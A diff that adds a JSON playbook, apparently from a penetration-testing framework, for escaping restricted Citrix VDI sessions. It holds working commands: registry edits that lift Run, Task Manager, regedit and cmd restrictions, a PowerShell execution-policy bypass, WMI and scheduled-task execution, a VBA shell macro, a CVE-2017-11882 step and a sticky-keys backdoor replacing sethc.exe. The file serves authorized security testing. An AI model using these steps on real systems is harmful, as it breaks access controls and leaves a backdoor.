@@ -1,0 +1,385 @@
+{
+  "id": "citrix_vdi_breakout",
+  "name": "Citrix VDI Breakout Techniques",
+  "description": "Escape from Citrix Virtual Desktop Infrastructure restrictions and published applications",
+  "category": "Breakout",
+  "subcategory": "VDI Escape",
+  "version": "1.0",
+  "author": "Breakout Testing Framework",
+  "tags": ["citrix", "vdi", "breakout", "escape", "published-app"],
+  "triggers": [
+    {
+      "id": "citrix_environment_detected",
+      "name": "Citrix Environment Detected",
+      "description": "Trigger when Citrix VDI environment is identified",
+      "conditions": {
+        "asset_type": "host",
+        "properties": {
+          "virtualization_platform": "citrix"
+        }
+      }
+    },
+    {
+      "id": "restricted_citrix_session",
+      "name": "Restricted Citrix Session",
+      "description": "Trigger when in restricted Citrix published application",
+      "conditions": {
+        "asset_type": "restrictedEnvironment",
+        "properties": {
+          "environment_type": "application",
+          "restrictions": "[\"kiosk\"]"
+        }
+      }
+    }
+  ],
+  "procedures": [
+    {
+      "id": "dialog_exploitation",
+      "name": "Dialog Box Exploitation",
+      "description": "Use common dialogs to escape application restrictions",
+      "order": 1,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "file_dialog_breakout",
+          "name": "File Dialog Breakout",
+          "description": "Use Open/Save dialogs to access file system",
+          "command": "# In any application with File menu: File -> Open -> Navigate to C:\\Windows\\System32\\ -> Right-click -> Open in new window",
+          "expectedOutput": "File Explorer window opens with system access",
+          "timeout": 60
+        },
+        {
+          "id": "print_dialog_exploitation",
+          "name": "Print Dialog Exploitation",
+          "description": "Use print dialogs to access system resources",
+          "command": "# In application: File -> Print -> Print to File -> Browse -> Navigate to system directories",
+          "expectedOutput": "Access to file system through print dialog",
+          "timeout": 60
+        },
+        {
+          "id": "help_dialog_breakout",
+          "name": "Help Dialog Breakout",
+          "description": "Exploit help dialogs for system access",
+          "command": "# Press F1 in application -> Right-click help content -> View Source -> file:///C:/Windows/System32/cmd.exe",
+          "expectedOutput": "Command prompt access through help system",
+          "timeout": 30
+        },
+        {
+          "id": "unc_path_navigation",
+          "name": "UNC Path Navigation",
+          "description": "Use UNC paths in dialogs to access network resources",
+          "command": "# In file dialog address bar: \\\\127.0.0.1\\c$ or \\\\localhost\\admin$",
+          "expectedOutput": "Access to administrative shares if available",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "task_manager_exploitation",
+      "name": "Task Manager Exploitation",
+      "description": "Use Task Manager to launch system processes",
+      "order": 2,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "access_task_manager",
+          "name": "Access Task Manager",
+          "description": "Attempt to open Task Manager using keyboard shortcuts",
+          "command": "# Press Ctrl+Shift+Esc or Ctrl+Alt+Del -> Task Manager",
+          "expectedOutput": "Task Manager interface if not restricted",
+          "timeout": 15
+        },
+        {
+          "id": "run_new_task",
+          "name": "Run New Task",
+          "description": "Use Task Manager to launch new processes",
+          "command": "# In Task Manager: File -> Run new task -> cmd.exe (check 'Create this task with administrative privileges')",
+          "expectedOutput": "Command prompt with potential elevated privileges",
+          "timeout": 30
+        },
+        {
+          "id": "browse_for_executable",
+          "name": "Browse for Executable",
+          "description": "Use browse button in Run dialog to access file system",
+          "command": "# In Run new task dialog: Browse -> Navigate to C:\\Windows\\System32\\cmd.exe",
+          "expectedOutput": "File system access through browse dialog",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "office_application_exploitation",
+      "name": "Microsoft Office Exploitation",
+      "description": "Use Office applications to break out of restrictions",
+      "order": 3,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "macro_execution",
+          "name": "Macro Execution",
+          "description": "Create and execute VBA macros for system access",
+          "command": "# In Word/Excel: Developer -> Visual Basic -> Insert Module -> Sub RunCmd(): Shell \"cmd.exe\", vbNormalFocus: End Sub",
+          "expectedOutput": "Command prompt launched via VBA macro",
+          "timeout": 60
+        },
+        {
+          "id": "object_insertion",
+          "name": "Object Insertion",
+          "description": "Insert executable objects in Office documents",
+          "command": "# In Word: Insert -> Object -> Create from File -> Browse to cmd.exe -> Check 'Display as icon'",
+          "expectedOutput": "Executable object embedded in document",
+          "timeout": 45
+        },
+        {
+          "id": "hyperlink_exploitation",
+          "name": "Hyperlink Exploitation",
+          "description": "Use hyperlinks to execute system commands",
+          "command": "# Create hyperlink to: file:///C:/Windows/System32/cmd.exe",
+          "expectedOutput": "System command execution via hyperlink",
+          "timeout": 30
+        },
+        {
+          "id": "equation_editor_exploit",
+          "name": "Equation Editor Exploit",
+          "description": "Exploit legacy Equation Editor if available",
+          "command": "# Insert -> Object -> Microsoft Equation 3.0 -> Exploit CVE-2017-11882 if vulnerable",
+          "expectedOutput": "Code execution through Equation Editor vulnerability",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "browser_exploitation",
+      "name": "Browser-Based Exploitation",
+      "description": "Use web browsers to escape application restrictions",
+      "order": 4,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "local_file_access",
+          "name": "Local File Access",
+          "description": "Access local files through browser file:// protocol",
+          "command": "# In browser address bar: file:///C:/ or file:///C:/Windows/System32/",
+          "expectedOutput": "Local file system browsing capability",
+          "timeout": 30
+        },
+        {
+          "id": "download_execution",
+          "name": "Download and Execution",
+          "description": "Download and execute files through browser",
+          "command": "# Download portable tools like cmd.exe or PowerShell from external source",
+          "expectedOutput": "Downloaded executable files for system access",
+          "timeout": 120
+        },
+        {
+          "id": "protocol_handler_abuse",
+          "name": "Protocol Handler Abuse",
+          "description": "Abuse protocol handlers to launch applications",
+          "command": "# Try various protocols: mailto:, ftp:, telnet:, custom protocols",
+          "expectedOutput": "External applications launched via protocol handlers",
+          "timeout": 30
+        },
+        {
+          "id": "javascript_execution",
+          "name": "JavaScript Execution",
+          "description": "Use JavaScript for local system interaction",
+          "command": "# JavaScript: new ActiveXObject('WScript.Shell').Run('cmd.exe')",
+          "expectedOutput": "System command execution via JavaScript",
+          "timeout": 15
+        }
+      ]
+    },
+    {
+      "id": "registry_manipulation",
+      "name": "Registry Manipulation",
+      "description": "Modify registry to bypass Citrix restrictions",
+      "order": 5,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "remove_run_restriction",
+          "name": "Remove Run Restriction",
+          "description": "Disable Run dialog restriction in registry",
+          "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 0 /f",
+          "expectedOutput": "Run dialog restriction removed",
+          "timeout": 15
+        },
+        {
+          "id": "enable_task_manager",
+          "name": "Enable Task Manager",
+          "description": "Re-enable Task Manager through registry",
+          "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 0 /f",
+          "expectedOutput": "Task Manager access restored",
+          "timeout": 15
+        },
+        {
+          "id": "enable_registry_editor",
+          "name": "Enable Registry Editor",
+          "description": "Re-enable Registry Editor access",
+          "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 0 /f",
+          "expectedOutput": "Registry Editor access restored",
+          "timeout": 15
+        },
+        {
+          "id": "enable_command_prompt",
+          "name": "Enable Command Prompt",
+          "description": "Remove command prompt restrictions",
+          "command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\System\" /v DisableCMD /t REG_DWORD /d 0 /f",
+          "expectedOutput": "Command prompt access enabled",
+          "timeout": 15
+        }
+      ]
+    },
+    {
+      "id": "alternative_execution_methods",
+      "name": "Alternative Execution Methods",
+      "description": "Use alternative methods to execute commands",
+      "order": 6,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "powershell_bypass",
+          "name": "PowerShell Execution Policy Bypass",
+          "description": "Bypass PowerShell execution policy restrictions",
+          "command": "powershell -ExecutionPolicy Bypass -Command \"Start-Process cmd.exe\"",
+          "expectedOutput": "Command prompt launched via PowerShell bypass",
+          "timeout": 30
+        },
+        {
+          "id": "wmi_execution",
+          "name": "WMI Command Execution",
+          "description": "Use WMI to execute commands",
+          "command": "wmic process call create \"cmd.exe /c echo WMI Execution Test\"",
+          "expectedOutput": "Command execution through WMI interface",
+          "timeout": 30
+        },
+        {
+          "id": "scheduled_task_creation",
+          "name": "Scheduled Task Creation",
+          "description": "Create scheduled task for command execution",
+          "command": "schtasks /create /tn \"BreakoutTest\" /tr \"cmd.exe /c echo Scheduled Task Test\" /sc once /st 23:59",
+          "expectedOutput": "Scheduled task created for later execution",
+          "timeout": 30
+        },
+        {
+          "id": "sticky_keys_backdoor",
+          "name": "Sticky Keys Backdoor",
+          "description": "Replace sticky keys with command prompt",
+          "command": "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe",
+          "expectedOutput": "Sticky keys replaced with command prompt",
+          "timeout": 15
+        }
+      ]
+    }
+  ],
+  "risks": [
+    {
+      "risk": "Dialog exploitation may be logged by Citrix monitoring",
+      "mitigation": "Use legitimate business workflows when possible"
+    },
+    {
+      "risk": "Registry modifications may trigger security alerts",
+      "mitigation": "Test registry changes in isolated environment first"
+    },
+    {
+      "risk": "File system access may violate data handling policies",
+      "mitigation": "Limit file access to necessary testing directories"
+    },
+    {
+      "risk": "Macro execution may be blocked by security policies",
+      "mitigation": "Test with documents from trusted sources if possible"
+    },
+    {
+      "risk": "System modifications may affect other users",
+      "mitigation": "Document all changes for cleanup purposes"
+    }
+  ],
+  "tools": [
+    {
+      "name": "Built-in Applications",
+      "version": "Any",
+      "required": true,
+      "purpose": "File dialogs, print dialogs, help systems"
+    },
+    {
+      "name": "Task Manager",
+      "version": "Any",
+      "required": false,
+      "purpose": "Process management and new task execution"
+    },
+    {
+      "name": "Microsoft Office",
+      "version": "Any",
+      "required": false,
+      "purpose": "VBA macro execution and object insertion"
+    },
+    {
+      "name": "Web Browser",
+      "version": "Any",
+      "required": false,
+      "purpose": "Local file access and download capabilities"
+    },
+    {
+      "name": "Registry Editor",
+      "version": "Any",
+      "required": false,
+      "purpose": "Registry modification for restriction bypass"
+    }
+  ],
+  "equipment": [
+    {
+      "name": "Citrix VDI Session",
+      "required": true,
+      "description": "Active Citrix virtual desktop or published application session"
+    },
+    {
+      "name": "User-level Access",
+      "required": true,
+      "description": "Standard user permissions within the Citrix environment"
+    }
+  ],
+  "suggestedFindings": [
+    {
+      "title": "Citrix Dialog Box Exploitation",
+      "description": "Successfully escaped application restrictions using file dialogs",
+      "severity": "medium",
+      "evidence": "Screenshots of file system access through dialogs"
+    },
+    {
+      "title": "Task Manager Access Available",
+      "description": "Task Manager accessible allowing process management",
+      "severity": "medium",
+      "evidence": "Task Manager interface and new task execution"
+    },
+    {
+      "title": "Microsoft Office Macro Execution",
+      "description": "VBA macros can be executed to run system commands",
+      "severity": "high",
+      "evidence": "Macro code and command execution results"
+    },
+    {
+      "title": "Browser-Based File System Access",
+      "description": "Local file system accessible through browser file:// protocol",
+      "severity": "medium",
+      "evidence": "Browser screenshots showing local file access"
+    },
+    {
+      "title": "Registry Modification Possible",
+      "description": "User registry can be modified to bypass restrictions",
+      "severity": "high",
+      "evidence": "Registry modification commands and before/after states"
+    },
+    {
+      "title": "Alternative Execution Methods",
+      "description": "Multiple methods available for executing arbitrary commands",
+      "severity": "high",
+      "evidence": "Command execution through various bypass techniques"
+    },
+    {
+      "title": "Citrix Security Control Bypass",
+      "description": "Successfully bypassed Citrix application restrictions",
+      "severity": "high",
+      "evidence": "Full system access achieved from restricted environment"
+    }
+  ]
+}
